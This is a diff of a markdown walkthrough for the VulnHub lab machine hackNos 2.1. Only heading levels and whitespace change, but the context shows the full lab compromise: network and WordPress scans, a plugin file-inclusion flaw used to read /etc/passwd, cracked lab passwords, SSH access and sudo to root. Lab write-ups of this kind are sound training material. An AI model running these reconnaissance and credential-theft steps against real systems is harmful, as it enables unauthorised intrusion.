@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.121
@@ -55,7 +53,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.02 seconds
 ```
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ dirb http://192.168.1.121
@@ -181,7 +179,7 @@ $ nikto -h http://192.168.1.121
 + 1 host(s) tested
 ```
 
-### WordPress Analysis
+## WordPress Analysis
 
 ```
 $ wpscan -e ap,at,u --url http://192.168.1.121/tsweb
@@ -386,7 +384,7 @@ Interesting Finding(s):
 Old Plugin Found: **gracemedia-media-player**\
 User found: **user**
 
-### Exploiting
+## Exploiting
 
 The old plugin `gracemedia-media-player` is vulnerable to Local File Inclusion (LFI): https://www.exploit-db.com/exploits/46537 \
 Validation exception with suggested PoC:
@@ -442,7 +440,7 @@ mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
 flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash
 ```
 
-### Cracking Password
+## Cracking Password
 
 Cracking **flag** user password:
 ```
@@ -466,7 +464,7 @@ Credentials:
 * User: **flag**
 * Pass: **topsecret**
 
-### SSH Access
+## SSH Access
 
 This credentials allows us SSH login:
 ```
@@ -532,7 +530,7 @@ flag@hacknos:/$ cd home
 flag@hacknos:/home$
 ```
 
-### Cracking rohit Password
+## Cracking rohit Password
 
 Looking for root files, we can find an unusual file: `/var/backups/passbkp/md5-hash`
 ```
@@ -574,7 +572,7 @@ Credentials:
 * User: **rohit**
 * Pass: **!%hack41**
 
-### Privilege Escalation - rohit
+## Privilege Escalation - rohit
 
 Now we only have to login with rohit credentials:
 ```
@@ -585,26 +583,26 @@ rohit@hacknos:~$ id
 uid=1000(rohit) gid=1000(rohit) groups=1000(rohit),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
 ```
 
-### Flag #1 - User
+## Flag #1 - User
 
 ```
 rohit@hacknos:~$ cat /home/rohit/user.txt 
 
-############################################ 
- __    __   _______   ______    ______             
-/  |  /  | /       | /      \  /      \   
+############################################
+ __    __   _______   ______    ______
+/  |  /  | /       | /      \  /      \
 $$ |  $$ |/$$$$$$$/ /$$$$$$  |/$$$$$$  |
-$$ |  $$ |$$      \ $$    $$ |$$ |  
-$$ \__$$ | $$$$$$  |$$$$$$$$/ $$ |       
-$$    $$/ /     $$/ $$       |$$ |           
+$$ |  $$ |$$      \ $$    $$ |$$ |
+$$ \__$$ | $$$$$$  |$$$$$$$$/ $$ |
+$$    $$/ /     $$/ $$       |$$ |
  $$$$$$/  $$$$$$$/   $$$$$$$/ $$/
-                                                    
+
 ############################################
 
 MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
 ```
 
-### Privilege Escalation - Root
+## Privilege Escalation - Root
 
 Rohit user already has super user privileges:
 ```
@@ -621,7 +619,7 @@ rohit@hacknos:~$ sudo id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Flag #2 - Root
+## Flag #2 - Root
 
 ```
 rohit@hacknos:~$ sudo su
@@ -637,9 +635,9 @@ $$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  #
 $$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   #
 $$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    #
 $$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     #
-#############################################################                                                          
-                                                          
-#############################################################                                                          
+#############################################################
+
+#############################################################
 MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
 Blog : www.hackNos.com
 Author : Rahul Gehlaut
